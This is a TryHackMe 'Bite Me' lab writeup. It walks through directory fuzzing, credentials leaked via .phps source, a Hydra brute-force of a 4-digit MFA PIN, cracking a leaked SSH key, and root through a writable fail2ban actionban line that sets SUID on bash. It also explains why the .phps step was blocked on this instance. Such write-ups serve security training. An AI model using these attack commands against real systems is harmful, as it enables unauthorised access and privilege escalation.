# Bite Me — TryHackMe Writeup

<img width="338" height="133" alt="Bite Me challenge banner" src="https://github.com/user-attachments/assets/3a0badb4-d030-4d3d-8669-f48ba66a8ef2" />

---

## Enumeration

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A -T4 10.114.167.12
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 12:51 -0400
Nmap scan report for 10.114.167.12
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 1b:79:c8:d0:cb:fe:fa:d2:78:94:7f:3e:36:8a:60:c2 (RSA)
|   256 7b:b9:96:4c:00:4a:d7:5e:c5:e4:51:84:e2:3e:d6:0e (ECDSA)
|_  256 ba:8c:e2:58:ed:64:00:49:11:ce:ad:82:d1:63:93:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 32.31 seconds
```

Visiting the site greets us with the default Apache page.

<img width="927" height="807" alt="Default Apache page" src="https://github.com/user-attachments/assets/31356cce-b07f-4d67-a382-0a507c57dfa1" />

### Directory fuzzing

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.114.167.12/FUZZ -fw 3499

console                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 34ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 35ms]
:: Progress: [220560/220560] :: Job [1/1] :: 1142 req/sec :: Duration: [0:03:18] :: Errors: 0 ::
```

`/console` turns up a login screen protected by a CAPTCHA — ruling out a naive brute-force.

<img width="671" height="660" alt="Console login with CAPTCHA" src="https://github.com/user-attachments/assets/a19f9f83-9356-4130-81a2-f3a8f150fb78" />

---

## Source Disclosure via `.phps`

Inspecting the page source reveals a hint left in the JS for "fred":

> *"fred I turned on php file syntax highlighting for you to review — jason"*

<img width="629" height="455" alt="Obfuscated JS hint" src="https://github.com/user-attachments/assets/09854b7c-9786-4339-8727-171c9dfaee5f" />

There's also a directory for the CAPTCHA library (Securimage), but this version isn't vulnerable to the known bypass.

<img width="818" height="464" alt="Securimage directory listing" src="https://github.com/user-attachments/assets/bf2aa7c7-5e30-4ed8-b78c-d95ef865373e" />

Apache can be configured to auto-highlight PHP source when a file is requested with a `.phps` extension. I fuzzed for these in `/console`:

<img width="1311" height="807" alt="Fuzzing for .phps files" src="https://github.com/user-attachments/assets/8a8e7a68-9958-403f-afd1-f110293ae6ef" />

Every request returned **403 Forbidden**.

### The version mismatch

After comparing notes with other public writeups, they were all able to pull `index.phps` cleanly — same steps, same box, no extra tricks. The only visible difference was the **Apache/PHP version**:

| | My instance | Other writeups |
|---|---|---|
| Apache | 2.4.41 | 2.4.29 |

<img width="802" height="295" alt="Apache version comparison" src="https://github.com/user-attachments/assets/47abc272-eea6-4ec3-8d6b-16e4c8269db9" />

I confirmed this is a real config difference and not just my instance being broken — see [Root Cause](#root-cause-of-the-403) below.

Since this is the intended path, I sourced the leaked credentials from another writeup to keep moving:

```
Username: jason_test_account
Password: braggy
```

---

## Multi-Factor Authentication

Logging in lands on an MFA page. The page source again leaves a note for fred:

> *"fred we need to put some brute force protection on here, remind me in the morning — jason"*

<img width="1006" height="610" alt="MFA page" src="https://github.com/user-attachments/assets/edfebc90-5681-4333-aa81-ab2eb87c3175" />
<img width="1888" height="362" alt="MFA JS hint" src="https://github.com/user-attachments/assets/3a78ce63-6f06-4c46-80d8-40123afb8acd" />

No rate limiting was ever added — so the 4-digit code is brute-forceable.

### Generating the wordlist

```python
#!/usr/bin/env python3

with open('brute.txt', 'w') as file:
    for i in range(0, 9999):
        padding = 4 - len(str(i))
        for j in range(0, padding):
            file.write("0")
        file.write(str(i) + "\n")
```

### Brute-forcing with Hydra

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l jason_test_account -P brute.txt 10.112.160.15 http-post-form "/console/mfa.php:code=^PASS^:H=Cookie\:user=jason_test_account;pwd=braggy:F=Incorrect code"

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking http-post-form://10.112.160.15:80/console/mfa.php:code=^PASS^:H=Cookie\:user=jason_test_account;pwd=braggy:F=Incorrect code
[80][http-post-form] host: 10.112.160.15   login: jason_test_account   password: 1838
1 of 1 target successfully completed, 1 valid password found
```

**Valid PIN: `1838`**

<img width="1314" height="518" alt="Dashboard access" src="https://github.com/user-attachments/assets/893b7238-26c3-452f-8942-2ce06738278e" />

---

## Foothold — SSH as jason

Using the dashboard's file viewer, `/etc/passwd` reveals two users: `fred` and `jason`. Reading `/home/jason/.ssh/id_rsa` returns an encrypted private key.

<img width="864" height="787" alt="id_rsa leaked" src="https://github.com/user-attachments/assets/09dd806f-5851-4a49-a06d-695eeba8b7c3" />

Cracking the key's passphrase with `ssh2john` + `john`:

<img width="817" height="504" alt="Cracking id_rsa passphrase" src="https://github.com/user-attachments/assets/8c67166e-19dc-4de8-a0ae-097422a7e037" />

SSH in as `jason` — user flag captured.

<img width="561" height="230" alt="User flag" src="https://github.com/user-attachments/assets/5c92cf93-6e73-4bb4-b27e-13176440b999" />

---

## Privilege Escalation

`sudo -l` shows jason has full sudo rights — but they require a password we don't have.

<img width="1070" height="168" alt="sudo -l as jason" src="https://github.com/user-attachments/assets/b704087b-791e-4cf5-9066-72496f96cefa" />

Switching to fred (`sudo -u fred newgrp`) and checking sudo rights there:

<img width="754" height="137" alt="sudo -l as fred" src="https://github.com/user-attachments/assets/849769c0-1a70-42d8-a718-61b30a24a7a0" />

fred can restart the `fail2ban` service — a known [fail2ban privilege escalation path](https://infosecwriteups.com/fail2ban-privilege-escalation-5de164aff6f3) if the `action.d` config files are writable.

```bash
bash-5.0$ ls -la iptables-multiport.conf
-rw-r--r-- 1 fred root 1448 Aug  1 10:01 iptables-multiport.conf
```

fred has write access. Modifying the `actionban` directive to set the SUID bit on bash:

```ini
actionban = chmod +s /bin/bash
actionunban = chmod +s /bin/bash
```

Triggering a ban by brute-forcing SSH with Hydra causes `fail2ban` to fire the malicious action, and running `bash -p` gives a root shell — root flag captured.

<img width="695" height="95" alt="Root flag" src="https://github.com/user-attachments/assets/f07237d2-67f1-4b25-9875-1ffeb93dc37d" />

---

## Root Cause of the 403

After gaining root, I confirmed why `.phps` was blocked on this instance. The box runs **two PHP versions** (7.2 and 7.4), and both `mods-available` configs explicitly deny access to `.phps` files:

<img width="731" height="415" alt="PHP config denying .phps access" src="https://github.com/user-attachments/assets/0871a495-d5de-4341-a054-5f6b0b8624f9" />

```apache
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    Require all denied
</FilesMatch>
```

Newer Ubuntu/PHP packaging ships this `Require all denied` directive **enabled by default** (it's commented out in older PHP 7.2-era configs), which is why this instance blocked `.phps` requests while writeups built against older Apache/PHP versions could access them freely. This is a hardening change in the PHP packaging, not a room bug — but it does mean the "intended" `.phps` disclosure step is inconsistent across box instances depending on provisioning/patch level.

---

## Summary

| Stage | Technique |
|---|---|
| Recon | `nmap`, `ffuf` directory brute-force |
| Source disclosure | `.phps` extension → PHP syntax highlighting leak |
| Auth bypass | Leaked credentials from `.phps` source |
| MFA bypass | Hydra brute-force of unthrottled 4-digit PIN |
| Foothold | LFI-style file viewer → leaked `id_rsa` → cracked passphrase |
| Privesc | `fail2ban` `actionban` config abuse → SUID bash |
